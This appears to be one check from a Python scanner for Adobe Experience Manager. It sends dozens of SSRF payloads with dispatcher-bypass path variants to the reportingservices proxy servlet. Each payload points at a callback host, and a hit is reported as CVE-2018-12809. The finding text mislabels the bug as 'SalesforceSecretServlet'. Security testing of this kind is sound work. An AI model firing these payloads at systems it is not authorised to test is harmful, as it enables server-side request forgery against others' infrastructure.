import concurrent.futures
import itertools
import json
import datetime
import traceback
import sys
import argparse
import base64
import time
from collections import namedtuple
from http.server import BaseHTTPRequestHandler, HTTPServer
from random import choice, randint
from string import ascii_letters
from threading import Thread
import requests


@register('reportingservices_servlet')
def ssrf_reportingservices_servlet(base_url, my_host, debug=False, proxy=None):
    global token, d
    results = []
    REPOSTINGSERVICESSERVLET1 = ('/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet?url={0}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.json?url={0}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.4.2.1...json?url={0}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.1.json?url={0}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/content/proxy.reportingservices.json?url={0}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/content/proxy.reportingservices.4.2.1...json?url={0}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/content/proxy.reportingservices.1.json?url={0}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet?url={0}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.json?url={0}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.4.2.1...json?url={0}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.1.json?url={0}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///proxy///reportingservices.json?url={0}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///proxy///reportingservices.4.2.1...json?url={0}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///proxy///reportingservices.1.json?url={0}%23/api1.omniture.com/a&q=a')
    REPOSTINGSERVICESSERVLET2 = ('/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet;%0a{0}.css?url={{0}}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet;%0a{0}.js?url={{0}}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet;%0a{0}.html?url={{0}}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet;%0a{0}.png?url={{0}}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet;%0a{0}.gif?url={{0}}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/content/proxy.reportingservices.json/{0}.css?url={{0}}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/content/proxy.reportingservices.json/{0}.js?url={{0}}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/content/proxy.reportingservices.json/{0}.html?url={{0}}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/content/proxy.reportingservices.json/{0}.ico?url={{0}}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/content/proxy.reportingservices.json/{0}.png?url={{0}}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/content/proxy.reportingservices.json;%0a{0}.css?url={{0}}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/content/proxy.reportingservices.json;%0a{0}.js?url={{0}}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/content/proxy.reportingservices.json;%0a{0}.html?url={{0}}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/content/proxy.reportingservices.json;%0a{0}.png?url={{0}}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/content/proxy.reportingservices.json;%0a{0}.bmp?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet;%0a{0}.css?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet;%0a{0}.js?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet;%0a{0}.html?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq/contentinsight///proxy///reportingservices.json.GET.servlet;%0a{0}.png?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq/contentinsight///proxy///reportingservices.json.GET.servlet;%0a{0}.gif?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///content///proxy.reportingservices.json/{0}.css?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///content///proxy.reportingservices.json/{0}.js?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///content///proxy.reportingservices.json/{0}.html?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///content///proxy.reportingservices.json/{0}.ico?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///content///proxy.reportingservices.json/{0}.png?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.css?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.js?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.html?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.ico?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///content///proxy.reportingservices.json;%0a{0}.png?url={{0}}%23/api1.omniture.com/a&q=a')
    cache_buster = random_string()
    REPOSTINGSERVICESSERVLET2 = (path.format(cache_buster) for path in REPOSTINGSERVICESSERVLET2)
    REPOSTINGSERVICESSERVLET3 = ('/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.css?url={{0}}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.js?url={{0}}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.html?url={{0}}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.ico?url={{0}}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.png?url={{0}}%23/api1.omniture.com/a&q=a', '/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.bmp?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.css?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.html?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.ico?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.png?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.bmp?url={{0}}%23/api1.omniture.com/a&q=a', '///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.js?url={{0}}%23/api1.omniture.com/a&q=a')
    cache_buster = randint(0, (2 ** 12))
    REPOSTINGSERVICESSERVLET3 = (path.format(cache_buster) for path in REPOSTINGSERVICESSERVLET3)
    for path in itertools.chain(REPOSTINGSERVICESSERVLET1, REPOSTINGSERVICESSERVLET2, REPOSTINGSERVICESSERVLET3):
        url = normalize_url(base_url, path)
        encoded_orig_url = base64.b16encode(url.encode()).decode()
        back_url = 'http://{0}/{1}/reportingservices/{2}/'.format(my_host, token, encoded_orig_url)
        url = url.format(back_url)
        try:
            http_request(url, proxy=proxy, debug=debug)
        except:
            if debug:
                error('Exception while performing a check', check='ssrf_reportingservices_servlet', url=url)
    time.sleep(10)
    if ('reportingservices' in d):
        u = base64.b16decode(d.get('reportingservices')[0]).decode()
        f = Finding('ReportingServicesServlet', u, 'SSRF via SalesforceSecretServlet (CVE-2018-12809) was detected. See - https://helpx.adobe.com/security/products/experience-manager/apsb18-23.html')
        results.append(f)
    return results
